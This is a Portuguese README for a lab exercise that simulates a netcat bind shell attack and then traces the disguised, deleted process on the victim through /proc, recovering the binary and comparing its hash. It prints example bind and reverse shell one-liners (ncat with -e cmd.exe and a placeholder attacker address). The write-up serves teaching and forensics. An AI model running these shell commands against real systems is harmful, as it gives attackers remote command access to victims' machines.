# bind-shell-attack

Nessa atividade foi necessário simular um bind shell attack, e após isso, no computador da vitima, recuperar o arquivo binário deletado desse ataque e analisar esse processo suspeito.

- Nesse ataque de backdoor foi utilizado o netcat, por mais que existam outras maneiras de realizar esse tipo de ataque.

Em um bind shell attack o computador da vítima é capaz de transmitir o executavel do bash, ou cmd, através de uma porta específica, para o computador da pessoa que deseja realizar esse ataque. No caso do netcat o atacante necessita fazer com que a vítima rode uma linha de comandos, transmitindo o bash para o computador do atacante. No caso do bind shell, o computador da vítima fica esperando que o computador de ataque se conecte ao ip e a porta.

Ex:
  C:\Program Files (x86)\Nmap>ncat -lvp 4444 -e cmd.exe  -> computador da vítima 
  
  nc x.x.x.x 4444 -> computador de ataque
  
Na atividade o netcat abre a porta tcp 41000 e envia informações para /dev/null do computador da vitima. Além disso ele mascara o nome do programa para "freedom",é colocado no diretorio /tmp(arquivos temporários), e após executado é removido, sobrando apenas o seu processo em execução.

![freedom](https://user-images.githubusercontent.com/44793167/96667221-06003680-132f-11eb-868f-c891f98685aa.jpg)

Após isso, na atividade era necessário utilizar o "nestat -nalp" para verificar a porta que esta aberta e o processo que está ocorrendo naquela porta, porém meu netstat não estava funcionando, mas foi possivel ver o processo em execução através do "ps", com o PID 16725.

![ps](https://user-images.githubusercontent.com/44793167/96667414-7018db80-132f-11eb-8ec3-24d72cb90de8.jpg)

Com o PID do nosso processo duvidoso, foi possível ver diversas informações sobre ele:

![info](https://user-images.githubusercontent.com/44793167/96667592-b5d5a400-132f-11eb-9272-0a0897fbe5ba.jpg)

Com isso, foi possivel ver que o arquivo binário do processo foi apagado, e assim foi necessário recuperar esse arquivo.

- Utilizando o comando:  cp /proc/16725/exe /tmp/recovered_bin

Para saber se a pessoa que atacava o computador da vítima estava utilzando o netcat, podemos comparar as hashes dos dois programas, e assim ver se eles são iguais.

![hashes](https://user-images.githubusercontent.com/44793167/96668117-da7e4b80-1330-11eb-9a5b-cfd2679cfcfd.jpg)

Dessa forma sabemos que o processo era o netcat, só que camuflado.

Além disso, foram realizados outros tipos de análise

![cmdline](https://user-images.githubusercontent.com/44793167/96668463-95a6e480-1331-11eb-9807-40b0c8dade13.jpg)

- Através dessa análise do comand line, é possivel notar que os nomes estão diferentes, sendo características de programas maliciosos, pois esse programa está mascarado com um nome diferente do seu nome original.

![enviro](https://user-images.githubusercontent.com/44793167/96668766-3eedda80-1332-11eb-8571-30c584f46daf.jpg)

- Através do enviroment do processo podemos ver quem ou o que iniciou o processo

![fd](https://user-images.githubusercontent.com/44793167/96668962-ac9a0680-1332-11eb-9623-732d471f28e7.jpg)

- Pelos file descriptors é possivel saber diretórios ou arquivos que o processo está usando para armazenar coisas, juntamente com seus sockets abertos

![maps](https://user-images.githubusercontent.com/44793167/96669192-203c1380-1333-11eb-9b37-159465b2b74f.jpg)

- Pelos process maps é possivel saber que bibliotecas o processo estava utilizando, além de ser possivel que apareçam links para arquivos maliciosos que o processo estava utilizando.

![status](https://user-images.githubusercontent.com/44793167/96669468-ab1d0e00-1333-11eb-9516-595d0121f89a.jpg)

- Nos status do processo é possivel ver o PID dos processos pai desse processo.

Além do bind shell atack, existe o reverse shell atack, onde o computador de ataque fica à espera que o computador da vítima se conecte a ele, ou seja, o computador do atacante só precisa declarar que porta ele estará escutando, e assim o computador do alvo precisa se conectar ao ip e porta do atacante, além transmitir o executável do bash ou cmd.

ex:

   nc -lvp 4444 -> computador de ataque 
   
   C:\Program Files (x86)\Nmap>ncat x.x.x.x 4444 -e cmd.exe -> computador do alvo


  
